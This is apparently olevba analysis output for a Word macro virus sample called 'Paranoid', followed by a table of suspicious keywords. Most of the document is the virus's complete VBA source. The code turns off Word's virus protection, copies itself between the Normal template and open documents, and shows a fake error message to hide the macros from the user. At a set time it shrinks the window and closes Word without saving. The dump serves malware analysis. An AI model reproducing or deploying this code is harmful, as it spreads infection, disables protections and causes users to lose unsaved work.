olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Para
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Para - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Paranoid.bas 
in file: Virus.MSWord.Para - OLE stream: 'Macros/VBA/paranoid'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Call PayLoad
Call Paranoid
End Sub
Sub FileSaveAs()
Call Paranoid
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileClose()
Call Paranoid
WordBasic.FileClose
End Sub
Sub Paranoid()
On Error Resume Next
With Options
    .VirusProtection = False
    .SaveNormalPrompt = False
    .ConfirmConversions = False
End With
Set BVictim = NormalTemplate.VBProject.VBComponents
Set SVictim = ActiveDocument.VBProject.VBComponents
If BVictim.Item("paranoid").Name <> "paranoid" Then
    SVictim("paranoid").Export "c:\paranoid.sys"
    Set DoIt = NormalTemplate.VBProject
    DoIt.VBComponents.Import ("c:\paranoid.sys")
    Kill ("c:\paranoid.sys")
End If
If SVictim.Item("paranoid").Name <> "paranoid" Then
    BVictim("paranoid").Export "c:\paranoid.sys"
    Set DoIt = ActiveDocument.VBProject
    DoIt.VBComponents.Import ("c:\paranoid.sys")
    Kill ("c:\paranoid.sys")
End If
End Sub
Sub FileExit()
Call AutoExit
WordBasic.FileExit
End Sub
Sub AutoExit()
Options.VirusProtection = True
End Sub
Sub ViewVBCode()
Call Stealth
End Sub
Sub FileTemplates()
Call Stealth
End Sub
Sub ToolsMacro()
Call Stealth
End Sub
Sub Stealth()
MsgBox "Íåîáõîäèìàÿ áèáëèîòåêà VBAGRP8.DLL íå íàéäåíà.", vbOKOnly + vbExclamation, "Microsoft Visual Basic"
End Sub
Sub PayLoad()
If Hour(Now) = 13 And Minute(Now) = 30 Then
a = Application.Width
b = Application.Height
Application.WindowState = wdWindowStateNormal
Application.Resize Width:=a, Height:=b
Application.Move Left:=0, Top:=0
c = (b / a) * 5
d = a / 5
For x = 0 To d
    Application.Resize Width:=a, Height:=b
    a = a - 5
    b = b - c
Next
MsgBox "Dis is di end, my only friend, di end...", vbOKOnly + vbExclamation + vbSystemModal, "Paranoid"
Application.Quit wdDoNotSaveChanges
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|DoIt                |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |VBAGRP8.DLL         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

